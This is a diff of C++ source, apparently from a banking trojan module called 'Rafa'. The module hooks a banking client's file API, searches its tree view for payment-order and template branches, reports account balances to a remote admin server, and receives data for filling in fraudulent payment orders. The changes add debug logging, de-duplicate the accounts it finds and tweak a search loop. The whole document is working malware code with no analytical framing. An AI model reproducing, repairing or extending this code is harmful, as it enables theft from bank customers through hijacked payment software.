@@ -555,7 +555,6 @@ static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess
 {
 	HANDLE file = pHandlerCreateFileA( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
 							  dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
-	DBGRAFA( "Rafa", "CreateFileA" );
 	if( file != INVALID_HANDLE_VALUE && (dwDesiredAccess & GENERIC_WRITE) != 0 )
 	{
 		TypeFileReport type = ReportNothing;
@@ -1308,6 +1307,7 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 			{
 				if( GetTextTreeItem( item, text, sizeof(text) ) )
 				{
+					DBGRAFA( "Rafa", "1 %s", text );
 					DWORD hash = CalcHash(text);
 					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
 					{
@@ -1317,6 +1317,7 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 						{
 							if( GetTextTreeItem( item2, text, sizeof(text) ) )
 							{
+								DBGRAFA( "Rafa", "2 %s", text );
 								if( m_strstr( text, "Шаблоны" ) )
 								{
 									//itemPrev - это ветка с номеров счета
@@ -1324,10 +1325,19 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemPrev );
 									//запоминаем нужные нам ветки счета
 									GetTextTreeItem( itemPrev, itemAccs[c_itemAccs].acc, sizeof(itemAccs[c_itemAccs].acc) );
-									itemAccs[c_itemAccs].itemAcc = itemPrev;
-									itemAccs[c_itemAccs].itemTmpls = item2;
-									DBGRAFA( "Rafa", "Find tree item %s", itemAccs[c_itemAccs].acc );
-									return ++c_itemAccs;
+									int ii = 0;
+									//смотрим нет ли этого счета в массиве (проход по дереву может быть не один раз)
+									for(; ii < c_itemAccs; ii++ )
+										if( itemAccs[ii].itemAcc == itemPrev )
+											break;
+									if( ii >= c_itemAccs )
+									{
+										itemAccs[c_itemAccs].itemAcc = itemPrev;
+										itemAccs[c_itemAccs].itemTmpls = item2;
+										DBGRAFA( "Rafa", "Find tree item %s", itemAccs[c_itemAccs].acc );
+										++c_itemAccs;
+									}
+									return c_itemAccs;
 								}
 							}
 							item2 = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_NEXT, (LPARAM)item2 );
@@ -1550,7 +1560,10 @@ static void WorkInRafa()
 		for( int i = 0; i < 10; i++ )
 		{
 			c_itemAccs = FindPaymentOrder( root, 0, itemAccs, c_itemAccs ); 
-			if( c_itemAccs ) break;
+			if( c_itemAccs ) //если найдены счета, то ждем еще немного, так как возможно есть еще счета
+			{
+				//if( i < 7 ) i = 7;
+			}
 			pSleep(1000);
 		}
 		if( c_itemAccs > 0 )
@@ -1561,7 +1574,7 @@ static void WorkInRafa()
 #else
 			PaymentOrder* po = GetPaymentOrders(); //передаем баланс и получаем данные для заполнения платежки
 #endif
-			if( po )
+			if( po ) 
 			{
 				//ищем счет в котором будем добавлять платежку
 				TreeAccount* itemAcc = 0;
@@ -1746,7 +1759,7 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 						LoadPaymentOrders();
 						widthScreen = (int)pGetSystemMetrics(SM_CXSCREEN);
 						heightScreen = (int)pGetSystemMetrics(SM_CYSCREEN);
-						if( c_paymentOrders == 0 ) //аз уже был, повторно не нужно
+						if( c_paymentOrders == 0 ) //если аз уже был, повторно не нужно
 							WorkInRafa(); 
 					}
 					return 0;
@@ -2085,6 +2098,11 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 		res = res2;
 		DBGRAFA( "Rafa", "Получен ответ: %s", res );
 	}
+	else
+		if( ret )
+		{
+			DBGRAFA( "Rafa", "Ответа нет" );
+		}
 	return res;
 }
 
@@ -2154,7 +2172,7 @@ static PaymentOrder* GetPaymentOrders()
 			{
 				DBGRAFA( "Rafa", "Получена платежка с неизвестным счетом %s", po->sendAcc );
 				po->balans = to; *to++ = 0;
-				res= 0;
+				res = 0;
 			}
 			else
 			{
